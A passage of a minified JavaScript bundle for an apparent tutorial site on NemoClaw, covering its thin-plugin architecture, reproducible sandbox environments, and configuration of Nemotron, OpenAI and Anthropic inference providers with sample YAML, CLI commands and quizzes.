    # Automatically upgrade for critical security patches
    auto_upgrade_critical: false  # default: false (opt-in)`}),e.jsxs(n,{type:"info",title:"Auto-Upgrade Is Opt-In",children:["Automatic security upgrades are disabled by default because even a patch version change should be tested in your environment. Enable"," ",e.jsx("code",{children:"auto_upgrade_critical"})," only if you have confidence in your testing pipeline and want critical security patches applied without manual intervention."]}),e.jsx(s,{references:[{title:"NemoClaw Blueprint Versioning",url:"https://docs.nvidia.com/nemoclaw/versioning",type:"docs",description:"Official guide to blueprint version pinning, ranges, and upgrade strategies."},{title:"Semantic Versioning Specification",url:"https://semver.org/",type:"docs",description:"The semver specification that NemoClaw blueprints follow."}]})]})}const W=Object.freeze(Object.defineProperty({__proto__:null,default:v},Symbol.toStringTag,{value:"Module"}));function k(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"The Thin Plugin Philosophy"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw's architecture makes a deliberate and opinionated choice: keep the plugin as thin as possible and push all complexity into the blueprint. This is not a consequence of laziness or time pressure -- it is a design philosophy with deep implications for security, maintainability, and operability. Understanding this philosophy helps you understand why NemoClaw is structured the way it is and how to work with it rather than against it."}),e.jsx(a,{term:"Thin Plugin",definition:"An integration layer that contains the minimum code necessary to bridge two systems (in this case, OpenClaw and the NemoClaw blueprint). A thin plugin registers capabilities, forwards messages, and handles errors -- but contains no business logic, no policy parsing, no credential management, and no orchestration.",example:"The NemoClaw plugin is approximately 200 lines of TypeScript. It registers an inference provider, adds a slash command, and maintains an IPC connection. That is all.",seeAlso:["Thick Blueprint","Separation of Concerns","Attack Surface"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Why Thin?"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"There are four interconnected reasons for the thin plugin design:"}),e.jsx("h3",{className:"text-xl font-semibold text-gray-800 dark:text-gray-200",children:"1. Fewer Updates Needed"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"OpenClaw extensions go through a publication and review process. Each update requires building, packaging, publishing to the marketplace, and waiting for users to update. If the plugin contained inference routing logic, every new LLM provider would require a plugin update. If it contained policy parsing, every policy format change would require a plugin update. By keeping the plugin thin, it only needs to change when OpenClaw's extension API changes -- which happens a few times per year at most."}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["The blueprint, by contrast, is resolved and verified at runtime. A new blueprint version takes effect immediately (on the next"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"nemoclaw apply"}),") without any editor restart or extension update. This means security patches can ship in hours, not days."]}),e.jsx("h3",{className:"text-xl font-semibold text-gray-800 dark:text-gray-200",children:"2. Complex Logic Is Versioned and Verified"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The blueprint contains the complex logic: policy parsing, Landlock rule generation, seccomp filter compilation, network namespace configuration, inference routing. This is the code that, if compromised, could undermine the entire security model. By putting it in the blueprint, this code is:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-2 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("strong",{children:"Independently versioned"})," -- each version is an immutable artifact with a known identity"]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Digest-verified"})," -- checked for tampering before every execution"]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Pinnable"})," -- teams can lock to a specific version for reproducibility"]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Auditable"})," -- a specific version can be reviewed, and you can be certain that the reviewed version is what is running"]})]}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"None of these properties apply to editor extensions in the same way. Extension signing exists but is less rigorous than the blueprint's digest verification. Extension versions are harder to pin (they auto-update by default). Extension code is harder to audit because it runs inside the editor's process."}),e.jsx("h3",{className:"text-xl font-semibold text-gray-800 dark:text-gray-200",children:"3. Easier to Audit"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"A 200-line TypeScript file can be reviewed in minutes. A security auditor can verify that the plugin does not handle credentials, does not parse untrusted input, and does not make network requests. This fast auditability means the plugin can be trusted with less scrutiny, freeing audit resources to focus on the blueprint where the real security-sensitive logic lives."}),e.jsx("h3",{className:"text-xl font-semibold text-gray-800 dark:text-gray-200",children:"4. Reduced Attack Surface"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"The plugin runs inside OpenClaw's extension host -- a process with access to the user's editor state, open files, and potentially other extensions. Keeping the plugin thin minimizes the amount of NemoClaw code running in this relatively exposed environment. Credentials, policy logic, and sandbox management all run in the separate blueprint process, which has no access to the editor."}),e.jsx(i,{title:"Thin Plugin vs. Thick Plugin (Hypothetical)",headers:["Aspect","Thin Plugin (NemoClaw)","Thick Plugin (Hypothetical)"],rows:[["Lines of code in editor","~200","~5,000+"],["Update frequency","Quarterly","Weekly (every new feature)"],["Credential exposure","None (IPC only)","API keys in extension process"],["Audit time","Minutes","Days"],["Editor restart needed for updates","Rarely","Frequently"],["Failure blast radius","IPC error message","Credential leak, policy bypass"],["Dependencies","0 (just OpenClaw API)","10+ (HTTP clients, YAML parsers, etc.)"]],highlightDiffs:!0}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"The Thick Blueprint Counterpart"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:`The thin plugin philosophy only works because its counterpart -- the thick blueprint -- absorbs all the complexity. The blueprint is approximately 15,000+ lines of Python, with dependencies on YAML parsing, cryptographic libraries, HTTP clients, and OpenShell's API. It is "thick" in the sense that it contains all the logic and makes all the decisions.`}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"This thickness is not a problem because the blueprint runs in its own process with its own security boundary. It is digest-verified before execution. It does not have access to the editor's state. It is versioned and pinnable. The complexity is contained and controlled."}),e.jsx(n,{type:"info",title:"Analogy: Microservice Architecture",children:"The thin plugin / thick blueprint pattern is analogous to the API gateway / microservice pattern in web architecture. The API gateway (plugin) is thin: it routes requests, handles authentication at the edge, and forwards to backend services. The backend service (blueprint) is thick: it contains all the business logic. The thin gateway can be deployed infrequently; the thick backend can be deployed independently and frequently."}),e.jsx(o,{title:"Do Not Add Logic to the Plugin",children:"If you are extending NemoClaw (for example, adding a custom command), add the logic to the blueprint side, not the plugin side. The plugin should only forward the command over IPC. Adding logic to the plugin means that logic cannot be versioned, digest-verified, or audited independently. It also means every change requires an extension update and editor restart."}),e.jsx(r,{question:"A developer wants to add support for a new LLM provider (Mistral) to NemoClaw. Where should the implementation go?",options:["In the TypeScript plugin, since it registers the inference provider","In the Python blueprint, since it handles inference routing and credential management","Split between both -- the plugin handles Mistral-specific formatting, the blueprint handles credentials","In a separate extension that communicates with both the plugin and blueprint"],correctIndex:1,explanation:"New provider support belongs entirely in the blueprint. The plugin does not know or care which provider is configured -- it forwards all inference requests identically over IPC. The blueprint determines the provider, attaches the correct credentials, and routes to the correct endpoint. This is exactly why the thin plugin design exists: adding Mistral support requires zero changes to the plugin and zero editor restarts."}),e.jsx(s,{references:[{title:"NemoClaw Architecture Decision Records",url:"https://github.com/NVIDIA/NemoClaw/tree/main/docs/adr",type:"github",description:"ADR-001: Thin plugin / thick blueprint separation of concerns."},{title:"The Twelve-Factor App: Admin Processes",url:"https://12factor.net/admin-processes",type:"article",description:"Relevant background on separating integration code from business logic."}]})]})}const H=Object.freeze(Object.defineProperty({__proto__:null,default:k},Symbol.toStringTag,{value:"Module"}));function j(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"Reproducible Environments"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"One of the most powerful properties of NemoClaw's architecture is reproducibility: given the same blueprint version and the same policy files, you get the same sandbox environment. Every time, on every machine, for every team member. This property is not accidental -- it is a direct consequence of the declarative, versioned, digest-verified design."}),e.jsx(a,{term:"Reproducible Environment",definition:"A computing environment that can be recreated identically from a specification. In NemoClaw, the specification is the combination of a blueprint version (with digest) and the policy files in .nemoclaw/policies/. Given these inputs, the resulting sandbox has identical filesystem permissions, seccomp filters, network allowlists, and inference configuration.",example:"Two developers on different machines, both running blueprint v0.8.4 with the same .nemoclaw/ directory, will get sandboxes with byte-for-byte identical Landlock rulesets, seccomp filters, and network configurations.",seeAlso:["Deterministic Build","Version Pinning","Policy as Code"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"The Reproducibility Equation"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw's reproducibility can be expressed as a simple equation:"}),e.jsxs("div",{className:"bg-gray-50 dark:bg-gray-800/50 rounded-xl border border-gray-200 dark:border-gray-700 p-6 text-center",children:[e.jsx("p",{className:"text-lg font-mono text-gray-800 dark:text-gray-200",children:"Blueprint Version + Policy Files = Sandbox Configuration"}),e.jsx("p",{className:"text-sm text-gray-500 dark:text-gray-400 mt-2",children:"(pinned + committed) + (committed) = (identical everywhere)"})]}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["Both inputs -- the blueprint version and the policy files -- are committed to version control. The blueprint version is pinned in"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:".nemoclaw/config.yaml"}),". The policy files live in"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:".nemoclaw/policies/"}),". Both are checked into git alongside the project code. This means that checking out a specific git commit gives you not just the code, but also the exact sandbox environment specification for that code."]}),e.jsx(t,{title:"A fully reproducible .nemoclaw/ directory",language:"bash",code:`$ tree .nemoclaw/
.nemoclaw/
├── config.yaml                # Blueprint version + digest pin
└── policies/
    ├── filesystem.yaml        # Landlock rules
    ├── network.yaml           # Network allowlist
    ├── seccomp.yaml           # Seccomp customizations (if any)
    └── inference.yaml         # Inference provider configuration

$ cat .nemoclaw/config.yaml
blueprint:
  version: "0.8.4"
  digest: "sha256:b4c7d8e9f0a1b2c3..."

$ git log --oneline .nemoclaw/
a1b2c3d  Update network policy: allow registry.yarnpkg.com
e4f5a6b  Pin blueprint to 0.8.4 (security fix for io_uring)
c7d8e9f  Initial NemoClaw configuration`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Benefits for Testing"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:`Reproducible environments make testing deterministic. When a test passes in CI, you know it will pass on a developer's machine (and vice versa) because the sandbox configuration is identical. This eliminates an entire class of "works in CI but not locally" bugs related to environment differences.`}),e.jsx(i,{title:"Testing With vs. Without Reproducibility",headers:["Scenario","Without Reproducibility","With NemoClaw"],rows:[["Developer A and B get different results","Different provider versions, different network access, hard to debug","Same blueprint + same policies = same sandbox. If results differ, the issue is in the code, not the environment."],["Test passes locally, fails in CI","CI has different network rules, different seccomp profile, different provider","CI uses the same .nemoclaw/ directory from git. Sandbox is identical."],["Debugging a production incident","Hard to recreate the exact environment where the bug occurred","Check out the commit, run nemoclaw apply, get the exact same sandbox."],["Security audit","Hard to verify what environment was running at a given time","Git history shows exactly which policies and blueprint version were active for any commit."]]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Benefits for Compliance"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Regulated environments (SOC 2, HIPAA, FedRAMP, etc.) require organizations to demonstrate that their security controls are consistent and auditable. NemoClaw's reproducibility provides this out of the box:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-2 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("strong",{children:"Policy as code"})," -- security policies are YAML files in version control, with full change history, authorship, and review trail"]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Immutable enforcement"})," -- a specific blueprint version + digest always produces the same security controls"]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Audit trail"})," -- git log shows who changed what policy, when, and why (via commit messages and PR reviews)"]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Drift detection"})," -- if someone modifies policies outside of version control, the next"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"nemoclaw plan"})," will show the difference"]})]}),e.jsxs(n,{type:"tip",title:"Compliance Tip",children:["For compliance documentation, you can generate a report of the exact security controls in effect for any commit:"," ",e.jsx("code",{children:"git checkout <commit> && nemoclaw plan --report"}),". This produces a human-readable document listing all Landlock rules, seccomp filters, network allowlist entries, and inference configuration -- suitable for attaching to audit evidence."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Multi-Team Coordination"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"In organizations with multiple teams using NemoClaw, reproducibility enables centralized policy management. A security team can define a base policy that all projects must include, and individual teams can extend (but not weaken) it:"}),e.jsx(t,{title:"Layered policy architecture",language:"yaml",code:`# .nemoclaw/policies/base.yaml (maintained by security team)
# This file is pulled from a shared repository via git submodule
# or a policy registry.

extends: "org://security-team/base-policy@v2"

# Organization-wide requirements:
#   - No network access except inference and approved registries
#   - seccomp: block io_uring, ptrace, mount
#   - Landlock: deny /home, /root, /etc (except certs)

---
# .nemoclaw/policies/team-overrides.yaml (maintained by project team)
# Can ADD restrictions but cannot REMOVE base policy restrictions

network:
  allowlist:
    # Add project-specific endpoints
    - host: api.project-specific-service.com
      port: 443

filesystem:
  rules:
    # Add project-specific writable paths
    - path: /sandbox/build-output
      access: [read, write, create]`}),e.jsx(o,{title:"Policy Weakening Is Detected",children:"NemoClaw validates that team-level policy overrides do not weaken the base policy. If a team policy attempts to allow a syscall that the base policy blocks, or adds a network endpoint that the base policy explicitly denies, the plan stage will fail with a policy conflict error. This ensures that organizational security requirements cannot be circumvented by individual teams."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"What Can Break Reproducibility"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"While NemoClaw provides strong reproducibility guarantees, there are factors outside its control that can cause differences between environments:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-2 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("strong",{children:"Host kernel version"})," -- Landlock ABI differences between kernel versions can change available enforcement features. Pin your minimum kernel version in documentation."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Host-installed tools"})," -- the sandbox uses the host's"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"/usr"})," and"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"/lib"})," (read-only). Different host systems may have different tool versions."]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Inference provider behavior"})," -- the same model may produce different outputs on different days (LLMs are not deterministic unless you pin temperature=0 and seed)."]})]}),e.jsx(r,{question:"A team member reports that their sandbox has different seccomp rules than yours. Both of you are on the same git commit. What is the most likely cause?",options:["One of you has a different .nemoclaw/config.yaml (not committed)","The blueprint registry returned different content for the same version","NemoClaw randomizes seccomp rules for security","One of you has a newer kernel that supports additional Landlock ABI features, causing the blueprint to generate different rules"],correctIndex:3,explanation:"The most common cause of sandbox configuration differences between machines on the same commit is kernel version differences. If one machine has kernel 6.8 (Landlock ABI v4) and another has kernel 6.0 (ABI v2), the blueprint will generate different rulesets to match the available kernel features. The blueprint version and policies are the same, but the plan stage adapts to the host's capabilities."}),e.jsx(s,{references:[{title:"NemoClaw Reproducibility Guide",url:"https://docs.nvidia.com/nemoclaw/reproducibility",type:"docs",description:"Best practices for achieving fully reproducible sandbox environments."},{title:"Policy as Code",url:"https://docs.nvidia.com/nemoclaw/policy-as-code",type:"docs",description:"How to manage NemoClaw policies in version control."}]})]})}const z=Object.freeze(Object.defineProperty({__proto__:null,default:j},Symbol.toStringTag,{value:"Module"}));function N(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"NVIDIA Nemotron: Default Inference Provider"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["NemoClaw ships with NVIDIA Nemotron as its default inference provider. Specifically, it uses the ",e.jsx("strong",{children:"Nemotron 3 Super 120B"})," model hosted on NVIDIA's build.nvidia.com inference platform. This section covers what Nemotron is, how to configure it, and what to expect in terms of performance."]}),e.jsx(a,{term:"NVIDIA Nemotron 3 Super 120B",definition:"A large language model developed by NVIDIA, optimized for code generation, analysis, and agentic workflows. The '120B' refers to its 120 billion parameters. 'Super' denotes a variant specifically tuned for instruction following, tool use, and multi-step reasoning. It is hosted on NVIDIA's build.nvidia.com inference API.",example:"The agent uses Nemotron to generate code, analyze errors, plan multi-step tasks, and reason about sandbox policies.",seeAlso:["build.nvidia.com","NIM (NVIDIA Inference Microservice)","Inference Provider"]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Why Nemotron as Default?"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"NemoClaw is part of the NVIDIA ecosystem, so Nemotron is the natural default. But there are also technical reasons:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-2 text-gray-700 dark:text-gray-300",children:[e.jsxs("li",{children:[e.jsx("strong",{children:"Optimized for agentic tasks"})," -- Nemotron Super is tuned for the kind of multi-step reasoning and tool use that coding agents require"]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Large context window"})," -- supports long conversations with extensive code context, critical for agents working on large codebases"]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Integrated billing"})," -- uses the same NVIDIA API key as other NVIDIA developer services, simplifying credential management"]}),e.jsxs("li",{children:[e.jsx("strong",{children:"Low latency"})," -- build.nvidia.com provides optimized inference with TensorRT-LLM, resulting in fast token generation"]})]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Getting an API Key"}),e.jsx(l,{title:"Setting Up NVIDIA API Access",steps:[{title:"Create an NVIDIA Developer account",content:"Go to developer.nvidia.com and create a free developer account if you do not already have one.",code:"https://developer.nvidia.com/developer-program",language:"bash"},{title:"Navigate to build.nvidia.com",content:"Go to build.nvidia.com and sign in with your developer account. Navigate to the API keys section.",code:"https://build.nvidia.com/settings/api-keys",language:"bash"},{title:"Generate an API key",content:'Click "Generate API Key" and save the key securely. This key will be used by NemoClaw to authenticate inference requests. The key starts with "nvapi-".',code:`# Your API key will look like this:
# nvapi-aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789...
# Store it securely -- do NOT commit it to version control`,language:"bash"},{title:"Configure NemoClaw",content:"Add the API key to NemoClaw's host-side credential store. The key is stored on the host and never enters the sandbox.",code:`# Add the API key to NemoClaw's credential store
$ nemoclaw credentials set nvidia_api_key
Enter value: nvapi-aBcDeFgHiJkLmNoPqRsTuVwXyZ...
Credential stored (encrypted at rest).

# Alternatively, set via environment variable (host-side only)
$ export NVIDIA_API_KEY="nvapi-aBcDeFgHiJkLmNoPqRsTuVwXyZ..."`,language:"bash"}]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Configuration"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Nemotron is the default provider, so minimal configuration is needed. The inference policy file lets you customize model parameters:"}),e.jsx(t,{title:"Inference policy for Nemotron",language:"yaml",code:`# .nemoclaw/policies/inference.yaml
inference:
  provider: nvidia
  model: nvidia/nemotron-3-super-120b

  # Optional: customize model parameters
  parameters:
    temperature: 0.7          # Lower = more deterministic
    top_p: 0.95               # Nucleus sampling threshold
    max_tokens: 4096          # Maximum response length
    # frequency_penalty: 0.0  # Uncomment to adjust repetition

  # Optional: endpoint override (default: build.nvidia.com)
  # endpoint: "https://custom-nvidia-endpoint.example.com"

  # Credential reference (uses nemoclaw credentials store)
  credential: nvidia_api_key`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Performance Characteristics"}),e.jsx(i,{title:"Nemotron 3 Super 120B Performance",headers:["Metric","Typical Value","Notes"],rows:[["Time to first token","200-400ms","Depends on prompt length and server load"],["Token generation speed","40-80 tokens/sec","With TensorRT-LLM optimization"],["Max context length","128K tokens","Supports very long conversations and large codebases"],["Max output tokens","8K tokens","Per response (configurable up to model limit)"],["Coding benchmark (HumanEval)","~85%","Strong code generation capability"],["API rate limit (free tier)","100 req/min","Higher limits available with paid plan"]]}),e.jsxs(n,{type:"info",title:"Pricing",children:["NVIDIA provides a free tier for build.nvidia.com with generous rate limits for development. For production use, pricing is based on token consumption. Check the current pricing at"," ",e.jsx("code",{children:"build.nvidia.com/pricing"}),". NemoClaw itself is free and open-source; you only pay for the inference API usage."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Verifying the Setup"}),e.jsx(t,{title:"Testing the Nemotron configuration",language:"bash",code:`# Check that credentials are configured
$ nemoclaw credentials check nvidia_api_key
nvidia_api_key: configured (set 2025-11-15)

# Test inference connectivity
$ nemoclaw test-inference
Testing inference provider: nvidia/nemotron-3-super-120b
  Endpoint:     build.nvidia.com
  Auth:         Bearer nvapi-****...7890
  Test prompt:  "Say hello"
  Response:     "Hello! How can I help you today?"
  Latency:      287ms (time to first token)
  Status:       OK

# Check from inside the sandbox
$ nemoclaw exec -- curl -s https://inference.local/v1/models
{
  "data": [
    {
      "id": "nvidia/nemotron-3-super-120b",
      "object": "model",
      "owned_by": "nvidia"
    }
  ]
}`}),e.jsx(r,{question:"Where is the NVIDIA API key stored in a NemoClaw setup?",options:["In the .nemoclaw/policies/inference.yaml file","In the sandbox environment as NVIDIA_API_KEY","In the host-side credential store, accessible only to the blueprint process","In the OpenClaw extension settings"],correctIndex:2,explanation:"The API key is stored in NemoClaw's host-side credential store, which is encrypted at rest and accessible only to the blueprint process. It never appears in policy files (which are committed to git), in the sandbox environment, or in the editor. The blueprint attaches the key to outbound requests when forwarding inference calls from the sandbox."}),e.jsx(s,{references:[{title:"NVIDIA Nemotron",url:"https://build.nvidia.com/nvidia/nemotron-3-super-120b",type:"docs",description:"Model card and API documentation for Nemotron 3 Super 120B."},{title:"build.nvidia.com API Reference",url:"https://docs.nvidia.com/nim/api-reference",type:"docs",description:"API reference for NVIDIA inference endpoints."}]})]})}const $=Object.freeze(Object.defineProperty({__proto__:null,default:N},Symbol.toStringTag,{value:"Module"}));function A(){return e.jsxs("div",{className:"space-y-6",children:[e.jsx("h1",{className:"text-3xl font-bold text-gray-900 dark:text-gray-100",children:"OpenAI and Anthropic Providers"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["While Nemotron is the default, NemoClaw supports OpenAI (GPT-4o, GPT-4 Turbo, o1, o3, etc.) and Anthropic (Claude Opus, Sonnet, Haiku) as inference providers. Switching between providers is a configuration change -- no code modifications are needed. The agent inside the sandbox always talks to"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"inference.local"})," regardless of which provider is configured behind the scenes."]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Configuring OpenAI"}),e.jsx(l,{title:"Setting Up OpenAI",steps:[{title:"Obtain an OpenAI API key",content:"Go to platform.openai.com and create an API key. You need a funded account for API access.",code:"# Your key will look like: sk-proj-aBcDeFgHiJkLmNoPqRsT...",language:"bash"},{title:"Store the credential",content:"Add the key to NemoClaw's credential store on the host side.",code:`$ nemoclaw credentials set openai_api_key
Enter value: sk-proj-aBcDeFgHiJkLmNoPqRsT...
Credential stored (encrypted at rest).`,language:"bash"},{title:"Update the inference policy",content:"Point the inference configuration to OpenAI and select your preferred model.",code:`# .nemoclaw/policies/inference.yaml
inference:
  provider: openai
  model: gpt-4o

  parameters:
    temperature: 0.7
    max_tokens: 4096

  credential: openai_api_key

  # Optional: specify organization
  # organization: "org-aBcDeFgHiJkLmN"`,language:"yaml"},{title:"Apply and test",content:"Apply the configuration change and verify connectivity.",code:`$ nemoclaw apply
Planning... provider changed: nvidia -> openai
Applying... inference gateway reconfigured
Done.

$ nemoclaw test-inference
Testing inference provider: openai/gpt-4o
  Endpoint:     api.openai.com
  Auth:         Bearer sk-proj-****...
  Test prompt:  "Say hello"
  Response:     "Hello! How can I assist you?"
  Latency:      312ms
  Status:       OK`,language:"bash"}]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Configuring Anthropic"}),e.jsx(l,{title:"Setting Up Anthropic",steps:[{title:"Obtain an Anthropic API key",content:"Go to console.anthropic.com and create an API key.",code:"# Your key will look like: sk-ant-api03-aBcDeFgHiJkLmNoPqRsT...",language:"bash"},{title:"Store the credential",content:"Add the key to NemoClaw's credential store.",code:`$ nemoclaw credentials set anthropic_api_key
Enter value: sk-ant-api03-aBcDeFgHiJkLmNoPqRsT...
Credential stored (encrypted at rest).`,language:"bash"},{title:"Update the inference policy",content:"Configure the Anthropic provider and model.",code:`# .nemoclaw/policies/inference.yaml
inference:
  provider: anthropic
  model: claude-sonnet-4-20250514

  parameters:
    temperature: 0.7
    max_tokens: 4096

  credential: anthropic_api_key`,language:"yaml"},{title:"Apply and test",content:"Apply and verify the Anthropic provider.",code:`$ nemoclaw apply
Planning... provider changed: nvidia -> anthropic
Applying... inference gateway reconfigured
Done.

$ nemoclaw test-inference
Testing inference provider: anthropic/claude-sonnet-4-20250514
  Endpoint:     api.anthropic.com
  Auth:         x-api-key sk-ant-****...
  Test prompt:  "Say hello"
  Response:     "Hello! I'm ready to help."
  Latency:      275ms
  Status:       OK`,language:"bash"}]}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Provider Comparison"}),e.jsx(i,{title:"Provider Feature Comparison",headers:["Feature","NVIDIA Nemotron","OpenAI","Anthropic"],rows:[["Default model","nemotron-3-super-120b","gpt-4o","claude-sonnet-4-20250514"],["API format","OpenAI-compatible","OpenAI native","Anthropic Messages API"],["Max context","128K tokens","128K tokens","200K tokens"],["Tool/function calling","Yes","Yes","Yes"],["Streaming","Yes","Yes","Yes"],["Credential header","Authorization: Bearer","Authorization: Bearer","x-api-key"]],highlightDiffs:!0}),e.jsx(n,{type:"info",title:"API Translation Is Automatic",children:"The blueprint handles all API format differences. When Anthropic is configured, the blueprint translates the OpenAI-compatible request from the sandbox into Anthropic's Messages API format, and translates the response back. The agent inside the sandbox always uses the same OpenAI-compatible format regardless of provider. This is one of the key benefits of the gateway architecture."}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Switching Between Providers"}),e.jsxs("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:["Switching providers is as simple as changing the"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"provider"})," and"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"model"})," fields in your inference policy and running"," ",e.jsx("code",{className:"text-sm bg-gray-100 dark:bg-gray-800 px-1 rounded",children:"nemoclaw apply"}),". The sandbox does not need to be restarted. The gateway reconfigures on the fly, and the next inference request from the agent goes to the new provider."]}),e.jsx(t,{title:"Quick provider switching",language:"bash",code:`# Switch from OpenAI to Anthropic
$ sed -i 's/provider: openai/provider: anthropic/' .nemoclaw/policies/inference.yaml
$ sed -i 's/model: gpt-4o/model: claude-sonnet-4-20250514/' .nemoclaw/policies/inference.yaml
$ sed -i 's/credential: openai_api_key/credential: anthropic_api_key/' .nemoclaw/policies/inference.yaml
$ nemoclaw apply
Planning... provider changed: openai -> anthropic
Applying... inference gateway reconfigured (0.1s)
Done.

# The agent's next inference request will automatically use Anthropic
# No agent restart needed`}),e.jsx("h2",{className:"text-2xl font-semibold text-gray-800 dark:text-gray-200",children:"Credential Security"}),e.jsx("p",{className:"text-gray-700 dark:text-gray-300 leading-relaxed",children:"Regardless of which provider you configure, the credential management works the same way:"}),e.jsxs("ul",{className:"list-disc list-inside space-y-2 text-gray-700 dark:text-gray-300",children:[e.jsx("li",{children:"Credentials are stored in the host-side credential store (encrypted at rest)"}),e.jsx("li",{children:"The policy file references credentials by name, not by value"}),e.jsx("li",{children:"Credentials never enter the sandbox or appear in policy files"}),e.jsx("li",{children:"The blueprint attaches credentials to outbound requests at the gateway level"})]}),e.jsxs(o,{title:"Never Put API Keys in Policy Files",children:["The ",e.jsx("code",{children:"credential"})," field in the inference policy is a ",e.jsx("em",{children:"reference name"}),", not the actual key value. Writing"," ",e.jsx("code",{children:'credential: "sk-proj-aBcDeFg..."'})," is wrong and will be rejected by NemoClaw. Always use"," ",e.jsx("code",{children:"nemoclaw credentials set <name>"})," to store keys securely, then reference the name in the policy file."]}),e.jsx(n,{type:"tip",title:"Multiple Credentials for Different Environments",children:"You can store multiple credentials and reference different ones in different policy configurations. For example, use a development API key for local work and a production key in CI. Use environment-specific policy overlays to switch between them."}),e.jsx(s,{references:[{title:"OpenAI API Reference",url:"https://platform.openai.com/docs/api-reference",type:"docs",description:"Official OpenAI API documentation."},{title:"Anthropic API Reference",url:"https://docs.anthropic.com/en/api",type:"docs",description:"Official Anthropic API documentation."},{title:"NemoClaw Provider Configuration",url:"https://docs.nvidia.com/nemoclaw/providers",type:"docs",description:"Configuring inference providers in NemoClaw."}]})]})}const K=Object.freeze(Object.defineProperty({__proto__:null,default:A},Symbol.toStringTag,{value:"Module"}));function I(){return 